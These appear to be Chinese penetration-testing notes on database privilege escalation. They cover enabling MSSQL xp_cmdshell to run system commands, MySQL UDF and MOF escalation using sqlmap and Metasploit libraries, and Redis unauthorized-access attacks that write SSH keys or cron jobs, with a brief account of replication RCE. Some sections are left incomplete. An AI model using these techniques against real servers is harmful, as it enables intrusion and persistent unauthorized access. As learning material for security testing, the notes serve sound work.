    cmdshell提权操作

    前提条件：

    ​ 1、账号拥有sysadmin属性即可（可以是SA、Administrator等高权限账户）

    注意：

    ​ xp_cmdshell不能执行系统增、删账号的操作（无权限，相当于普通账户，即使时SA或Administrator也不行）

    ​ 不能通过xp_cmdshell写入文件，只能执行系统命令

    ​ 可以执行上传的C2

    【实际示例】

    1、exec sp_configure ‘show advanced options’,1;

    ​

    ​ 解释：开启sp_configure中高级操作

    ​ exec sp_configure ‘show advanced options’; #查看sp_configure中高级选项的值

    ​ sp_configure：显示或更改当前服务器的全局配置设置。

    ​ show advanced options：显示高级选项，默认为0，要手动开启（开启可使用xp_cmdshell）

    2、exec sp_configure ‘xp_cmdshell’,1;

    ​

    ​ 解释：开启xp_cmdshell

    ​ exec sp_configure ‘xp_cmdshell’; #查看cmdshell命令开启状态

    ​ sp_configure：显示或更改当前服务器的全局配置设置。

    ​ xm_cmdshell：查看该命令是否开启，默认0，要手动开启（开启后可执行系统命令）

    3、exec master..xp_cmdshell ‘whoami’;

    ​

    ​ 解释：验证是否可以执行命令‘ whoami ’可以换成‘ ipconfig ’、‘ net user ’等

    ​ 注意：xp_cmdshell执行whoami时不会显示账号名（数据库账号类型不是sysadmin不能执行xp_cmdshell）

    ​ master..xp_cmdshell的全写是master.dbo.xp_cmdshell

    UDF提权

    漏洞原理

    ​ 自定义函数，是数据库功能的一种扩展。用户通过自定义函数可以实现在 MySQL 中无法方便实现的功能，其添加的新函数都可以在SQL语句中调用，就像调用本机函数 version() 等方便。

    补充

    ​ 如果是 MySQL >= 5.1 的版本，必须把 UDF 的动态链接库文件放置于 MySQL 安装目录下的 lib\plugin 文件夹下文件夹下才能创建自定义函数。

    ​ kali自带了UDF模块，路径：/usr/share/metasploit-framework/data/exploits/mysql

    利用条件

    ​ 1.sqlmap的UDF：sqlmap根目录/data/udf/mysql，Kali的UDF：/usr/share/metasploit-framework/data/exploits/mysql

    ​ 2.那么动态链接库文件去哪里找呢？实际上我们常用的工具 sqlmap 和 Metasploit 里面都自带了对应系统的动态链接库文件。

    ​ 3.sqlmap还自带了动态链接库，攻击者为了防止被误杀都经过编码处理过，不能被直接使用。不过可以利用 sqlmap 自带的解码工具cloak.py 来解码使用，cloak.py 的位置为：sqlmap根目录/extra/cloak/cloak.py

    ​ 解码32位的windows动态链接库：python3 cloak.py -d -i lib_mysqludf_sys.dll_ -o lib_mysqludf_sys_32.dll

    ​ 其他linux和windows动态链接库解码类似；

    ​ 或者直接使用metasploit自带的动态链接库，无需解码

    为什么要提权：MYSQL不支持执行系统命令，提权用与执行系统命令

    原理

    ​ 利用C:/windows/system32/wbem/mof/目录下的nullevt.mof文件，每分钟都会在一个特定的时间去执行一次的特性，来写入我们的cmd命令使其被带入执行（有点像条件竞争）

    先决条件

    ​ 1、Win sever 03以后无法使用（仅做了解，未作记录）

    ​ 2、Mysql启动身份具有权限去读写c:/windows/system32/wbem/mof目录

    ​ 3、secure-file-priv参数不为null

    关于outfile和dumpfile的区别:

    ​ outfile后面不能接0x开头或者char转换以后的路径，只能是单引号路径,但是值的部分可以时16进制

    ​ outfile文件中一行的末尾会自动换行，且可以导出全部数据，同时如果文本中存在\n等字符,会自动转义成\n,也就是会多加一个\n

    ​ outfile函数可以导出多行，outfile函数在将数据写到文件里时有特殊的格式转换，

    ​ dumpfile只能导出一行数据，dumpfile则保持原数据格式

    ​ dumpfile一行的末尾不会换行且只能导出部分数据；

    ​ dumpfile不会自动对文件内容进行转义,而是原意写入（UDF提权时使用dumpfile来写入）

    protected-mode说明

    protected-mode是redis本身的一个安全层，这个安全层的作用：就是只有【本机】可以访问redis，其他任何都不可以访问redis。这个安全层开启必须满足三个条件，不然安全层处于关闭状态：

    （1）protected-mode yes（处于开启）

    （2）没有bind指令。原文：The server is not binding explicitly to a set of addresses using the “bind” directive.

    （3）没有设置密码。原文：No password is configured。密码的优先级高。

    这时redis的保护机制就会开启。开启之后，只有本机才可以访问redis。 如果上面三个条件任何一个不满足，就不会开启保护机制。

    ​ 2、bind地址为0.0.0.0

    ​ 3、未开启密码保护

    利用条件：

    ​ 1、redis绑定在 0.0.0.0:6379，且没有进行添加防火墙规则避免其他非信任来源ip访问等相关安全策略，直接暴露在公网。

    ​ 2、没有设置密码认证（一般为空），可以免密码远程登录redis服务。

    ​ 3、redis使用root运行（service redis start是以redis普通账户运行的，redis-server /etc/redis/redis.conf #以root账户运行redis）

    Kali上用redis-cli连接

    ​ 无密码连接：redis-cli -h host -p port

    ​ 有密码连接：redis-cli -h hostip -p port -a password

    ​ 使用 ” ping “ 命令检查连接是否成功，回显 ” PONG “则连接成功

    写入SSH公钥

    利用条件

    ​ 服务端的Redis连接存在未授权，在攻击机上能用redis-cli直接登陆连接，并未登陆验证。

    ​ 服务端存在.ssh目录并且有写入的权限。

    ​ 必须是以root账户运行，redis-server /etc/redis/redis.conf

    ​ Redis主机上root目录下有“ ./ssh ”目录

    原理：数据库中插入一条数据，将本机的公钥作为value，key值随意，然后通过修改数据库的默认路径为/root/.ssh和默认的缓冲文件authorized.keys，把缓冲的数据保存在文件里，这样就可以在服务器端的/root/.ssh下生成一个授权的key。

    注意：将所有缓冲区的内容下入到authorized.keys文件，只要公钥的内容没被破坏（也不可能破坏）就可以连接上

    1、自己电脑生成公钥文件（Kali上执行）

    2、将公钥写入Redis中

    ​ 说明：将公钥导入key.txt文件(前后用\n换行，避免和Redis里其他缓存数据混合)，再把key.txt文件内容写入目标主机的缓冲里：

    ​ (echo -e "\n\n"; cat 公钥文件; echo -e "\n\n") > key.txt

    3、将数据保存到目标redis硬盘上

    ​ 说明：使用攻击机连接目标机器Redis，设置Redis的备份路径为/root/.ssh/并保存文件名为authorized_keys，并将数据保存在目标服务器硬盘上

    写入计划任务

    前提条件：

    ​ 服务端的Redis连接存在未授权，在攻击机上能用redis-cli直接登陆连接，并未登陆验证

    ​ Root权限运行Redis服务（可选）

    原理：

    ​ 1、在数据库中插入一条数据，将计划任务的内容作为value，key值随意，

    【01-主从复制RCE】

    PS：未安装成功，未作记录

    背景：
    利用 crontab、ssh key、webshell 这三种方式具有一定的容错性，同时 crontab、ssh 服务是服务器的标准命令和服务，因此很多情况下这种通过写文件的方式 getshell 是通杀的。但随着现代服务部署方式的不断发展，组件化成了不可逃避的大趋势。docker就是在该时代背景下的产物之一，在这种部署模式下，一个单一的容器中不会有除了 redis 以外的任何服务存在，包括 ssh 和 crontab，再加上权限的严格控制，所以单纯依靠写文件就很难getshell，在这种情况下我们就需要其他的利用手段。
    产生：
    Redis 在 4.x、5.x 版本中提供了主从模式，主从模式指的是使用单个 redis 为主机，而将其他 redis 作为从机，主机和从机的数据都是一样的，主机只负责写，从机只负责读。在 Redis 4.x 版本后，通过外部扩展可以实现一个新的 Redis 命令来构造恶意 .so 文件，在两个 Redis 实例中设置主从模式的时候，主机可以通过 FULLRESYNC 同步文件到从机上，然后在从机上加载恶意 .so 文件即可执行命令。简单的说就是攻击者（主机）写一个 .so 文件，通过 FULLRESYNC 同步文件到受害者（从机）上。
    利用条件：
    Redis版本：4.x，< 5.0.5
